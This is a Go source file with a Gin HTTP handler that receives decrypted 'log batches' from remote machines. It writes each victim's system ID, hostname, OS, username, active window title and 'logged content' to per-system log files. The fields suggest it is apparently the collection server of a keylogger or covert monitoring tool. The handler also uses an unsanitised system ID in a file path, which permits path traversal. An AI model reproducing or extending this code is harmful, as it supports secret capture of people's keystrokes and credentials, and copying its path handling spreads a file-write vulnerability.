package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/gin-gonic/gin"
)

func save_to_file(payload LogPayload, decryptedLogContent string, c *gin.Context) error {
	if len(decryptedLogContent) > MAX_LOG_CHARACTERS {
		log.Printf("ERROR: Decrypted log content from system %s exceeds maximum allowed length (%d > %d). Rejecting.",
			payload.SystemInfo.SystemID, len(decryptedLogContent), MAX_LOG_CHARACTERS)
		c.JSON(http.StatusRequestEntityTooLarge, gin.H{"error": "Log content exceeds maximum allowed length"})
		return fmt.Errorf("log content exceeds maximum allowed length: %d > %d", len(decryptedLogContent), MAX_LOG_CHARACTERS)
	}

	logDir := filepath.Join(LOGS_DIR, payload.SystemInfo.SystemID)
	if err := os.MkdirAll(logDir, 0755); err != nil {
		log.Printf("ERROR: Failed to create log directory '%s': %v", logDir, err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create log directory", "details": err.Error()})
		return fmt.Errorf("failed to create log directory: %w", err)
	}

	logFileName := fmt.Sprintf("%s_%s_%s.log",
		payload.SystemInfo.Hostname,
		time.Now().Format("2006-01-02"),
		payload.SystemInfo.SystemID[:8])

	logFilePath := filepath.Join(logDir, logFileName)
	logEntry := fmt.Sprintf(
		"----- Log Batch Start (UTC: %s, Duration: %.2fs) -----\n"+
			"System ID: %s\nHostname: %s\nOS: %s (%s)\nUsername: %s\nActive Window: %s\n"+
			"Logged Content:\n%s\n"+
			"----- Log Batch End (Server UTC: %s) -----\n\n",
		payload.LogStartTimeUTC,
		payload.LogDurationSeconds,
		payload.SystemInfo.SystemID,
		payload.SystemInfo.Hostname,
		payload.SystemInfo.OS,
		payload.SystemInfo.OSRelease,
		payload.SystemInfo.Username,
		payload.SystemInfo.ActiveWindow,
		decryptedLogContent,
		time.Now().Format("2006-01-02 15:04:05"),
	)

	f, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("ERROR: Failed to open log file '%s': %v", logFilePath, err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to open log file", "details": err.Error()})
		return fmt.Errorf("failed to open log file: %w", err)
	}
	defer f.Close()

	if _, err := f.WriteString(logEntry); err != nil {
		log.Printf("ERROR: Failed to write to log file '%s': %v", logFilePath, err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to write to log file", "details": err.Error()})
		return fmt.Errorf("failed to write to log file: %w", err)
	}

	log.Printf("Received and decrypted log batch from system %s. Stored to %s", payload.SystemInfo.SystemID, logFilePath)
	c.JSON(http.StatusOK, gin.H{"message": "Log batch received successfully", "log_file": logFileName})

	return nil
}
